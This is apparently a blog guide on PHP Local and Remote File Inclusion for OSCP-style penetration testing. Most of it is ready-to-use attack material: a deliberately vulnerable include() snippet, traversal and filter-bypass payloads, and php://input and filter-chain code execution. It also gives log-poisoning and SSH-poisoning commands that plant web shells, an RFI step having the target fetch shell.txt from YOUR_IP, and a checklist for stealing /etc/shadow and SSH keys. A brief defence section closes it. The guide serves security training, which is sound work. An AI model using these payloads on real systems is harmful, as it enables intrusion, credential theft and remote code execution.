---
title: " File Inclusion Vulnerabilities: LFI & RFI Explained "
description: >-
        A practical guide to Local and Remote File Inclusion attacks
author: anorak
date: 2025-11-30 03:10:00 +0530
categories: [ GUIDE, CYBERSECURITY]
tags: [Cybersecurity, Security, LFI, RFI, OSCP, Web-Security, Penetration-Testing ]
pin: True
---

## Introduction: The Dangerous Include

Web applications often need to dynamically load content—templates, language files, or user-uploaded data. Developers use functions like PHP's `include()`, `require()`, or `file_get_contents()` to accomplish this. But what happens when an attacker can control *which* file gets loaded?

**File Inclusion vulnerabilities** allow an attacker to trick a web server into including files that were never meant to be accessed. In the best case, they read sensitive configuration files. In the worst case, they achieve **Remote Code Execution (RCE)**.

 


## The Theory: How Inclusion Works

Consider this common PHP pattern:

```php
<?php
    $page = $_GET['page'];
    include($page . ".php");
?>
```

The developer expects users to request `?page=home` or `?page=about`. The server then loads `home.php` or `about.php`. Simple, right?

**The Flaw:** The developer trusts user input. An attacker can manipulate the `page` parameter to load *any* file the web server process can read.

 
### Types of File Inclusion Attacks
>   * **LFI (Local File Inclusion):** Read files *on the server itself*.
>   * **RFI (Remote File Inclusion):** Load malicious files from *your own server*.
>   * **Impact:** Information disclosure, source code leaks, and full system compromise.

 
## Local File Inclusion (LFI)

LFI allows you to read files that exist on the target server. This is the more common and frequently exploitable variant.
![ Local File Inclusion  ](/assets/img/202511/lfi.png){: .center}
### Basic LFI: Reading /etc/passwd

The classic proof-of-concept. If you can read `/etc/passwd`, you have confirmed LFI.

```
# Basic directory traversal
http://target.com/index.php?page=../../../etc/passwd

# URL-encoded version (bypasses basic filters)
http://target.com/index.php?page=....//....//....//etc/passwd
```

  * **`../`**: This sequence moves up one directory level.
  * **Why `/etc/passwd`?**: It is world-readable on Linux systems and confirms the vulnerability without causing harm.

### Bypassing the ".php" Extension

Remember our vulnerable code appends `.php` to the input. How do we bypass this?

#### Method 1: Null Byte Injection (Legacy)

On older PHP versions (< 5.3.4), the null byte `%00` terminates the string early.

```
http://target.com/index.php?page=../../../etc/passwd%00
```

The server sees `../../../etc/passwd` and ignores the `.php` suffix.

#### Method 2: Path Truncation

Some systems have a maximum path length. By padding your input with excessive `./` sequences, you can cause the `.php` extension to be truncated.

```
http://target.com/index.php?page=../../../etc/passwd/./././././<...repeat...>/./
```

 

## LFI Filter Bypasses

Developers often implement basic filters. Here is how to defeat them.

### Bypass 1: Double Encoding

If the application decodes input twice, double URL-encode your payload.

```
# Single encoded: ../
%2e%2e%2f

# Double encoded: ../
%252e%252e%252f
```

### Bypass 2: Using PHP Wrappers

PHP provides "wrappers" that can transform how files are read. These are goldmines for exploitation.

#### php://filter (Read Source Code)

This wrapper lets you Base64-encode a file's contents, bypassing PHP execution.

```
http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config
```

  * **Output:** A Base64 string of `config.php`.
  * **Decode it:** `echo "BASE64_STRING" | base64 -d`

This is critical for OSCP—you can leak database credentials, API keys, and hardcoded passwords.

#### php://input (Code Execution)

If `allow_url_include` is enabled, you can execute arbitrary PHP code.

```bash
# Send a POST request with PHP code in the body
curl -X POST "http://target.com/index.php?page=php://input" \
     -d "<?php system('id'); ?>"
```

### Bypass 3: Wrapper Chains

Modern exploitation uses wrapper chains for complex bypasses. Tools like `php_filter_chain_generator` automate this.

```bash
# Generate a chain that writes "<?php system($_GET['cmd']); ?>"
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

 

## LFI to RCE: The Escalation Path

Reading files is useful, but **Remote Code Execution** is the goal. Here are proven techniques.

### Technique 1: Log Poisoning

Web servers log every request. If you can include the log file, you can execute code you injected into it.

#### Apache Access Log Poisoning

```bash
# Step 1: Inject PHP code into the User-Agent header
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include the log file with your command
http://target.com/index.php?page=../../../var/log/apache2/access.log&cmd=id
```

  * **Common log paths:**
    * `/var/log/apache2/access.log` (Debian/Ubuntu)
    * `/var/log/httpd/access_log` (RHEL/CentOS)
    * `/var/log/nginx/access.log` (Nginx)

### Technique 2: SSH Log Poisoning

If SSH is running and you can read `/var/log/auth.log`:

```bash
# Step 1: Attempt SSH login with PHP code as username
ssh '<?php system($_GET["cmd"]); ?>'@target.com

# Step 2: Include the auth log
http://target.com/index.php?page=../../../var/log/auth.log&cmd=id
```

### Technique 3: /proc/self/environ

On some configurations, environment variables contain user-controlled data.

```
http://target.com/index.php?page=../../../proc/self/environ
```

If the output contains your `User-Agent`, inject PHP code there.

### Technique 4: Session File Inclusion

PHP stores session data in files. If you control session variables:

```bash
# Step 1: Set a session variable containing PHP code
# (requires a vulnerable feature that stores user input in session)

# Step 2: Include the session file
http://target.com/index.php?page=../../../var/lib/php/sessions/sess_<SESSION_ID>
```

 

## Remote File Inclusion (RFI)

RFI is rarer but more devastating. It requires `allow_url_include = On` in PHP configuration (disabled by default since PHP 5.2).

### Basic RFI Attack

```bash
# Step 1: Host a malicious PHP file on your server
# File: shell.txt (use .txt to avoid local execution)
<?php system($_GET['cmd']); ?>

# Step 2: Start a web server
python3 -m http.server 80

# Step 3: Include your remote file
http://target.com/index.php?page=http://YOUR_IP/shell.txt&cmd=id
```

### Bypassing Extension Filters

If the application appends `.php`, use a query string or fragment to nullify it:

```
http://target.com/index.php?page=http://YOUR_IP/shell.txt?
http://target.com/index.php?page=http://YOUR_IP/shell.txt%23
```

The `?` or `#` causes `.php` to be treated as a query parameter or fragment, not a file extension.

 

## OSCP Enumeration Checklist

When you encounter a potential file inclusion vulnerability:

### Step 1: Confirm LFI

```bash
# Test these paths systematically
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc/passwd
```

### Step 2: Identify the OS

  * **Linux:** Target `/etc/passwd`, `/etc/shadow`, `/proc/version`
  * **Windows:** Target `C:\Windows\win.ini`, `C:\Windows\System32\drivers\etc\hosts`

### Step 3: Extract Valuable Files

| File | Purpose |
|------|---------|
| `/etc/passwd` | User enumeration |
| `/etc/shadow` | Password hashes (if readable) |
| `/var/www/html/config.php` | Database credentials |
| `/home/user/.ssh/id_rsa` | SSH private keys |
| `/proc/self/cmdline` | Running process arguments |
| `C:\inetpub\wwwroot\web.config` | IIS configuration |

### Step 4: Attempt RCE

```bash
# Try log poisoning first (most reliable)
# Then PHP wrappers
# Finally, check for RFI (rare but instant win)
```

 

## Defense and Mitigation

Understanding defenses helps you identify bypasses during engagements.

  * **Input Validation:** Whitelist allowed values. Never pass user input directly to file functions.
  
    ```php
    $allowed = ['home', 'about', 'contact'];
    if (in_array($_GET['page'], $allowed)) {
        include($_GET['page'] . '.php');
    }
    ```

  * **Disable Dangerous Settings:**
    ```ini
    allow_url_include = Off
    allow_url_fopen = Off
    ```

  * **Use Absolute Paths:** Avoid relative path resolution entirely.
  
    ```php
    include('/var/www/html/pages/' . basename($_GET['page']) . '.php');
    ```

  * **Web Application Firewall (WAF):** Deploy rules to block traversal sequences and PHP wrappers.

 

## Quick Reference: One-Liners

```bash
# Basic LFI test
curl "http://target/index.php?page=../../../etc/passwd"

# PHP filter to read source code
curl "http://target/index.php?page=php://filter/convert.base64-encode/resource=config"

# Log poisoning (inject + trigger)
curl -A "<?php system(\$_GET['c']); ?>" http://target/
curl "http://target/index.php?page=/var/log/apache2/access.log&c=id"

# RFI test
curl "http://target/index.php?page=http://YOUR_IP/shell.txt"
```

 

### Final Thoughts

File Inclusion vulnerabilities are a testament to the dangers of trusting user input. They appear simple on the surface but offer multiple escalation paths to full system compromise. For OSCP, master the filter bypass techniques and log poisoning—these are your bread and butter for turning a "read file" bug into a shell.

**Happy Hacking.**
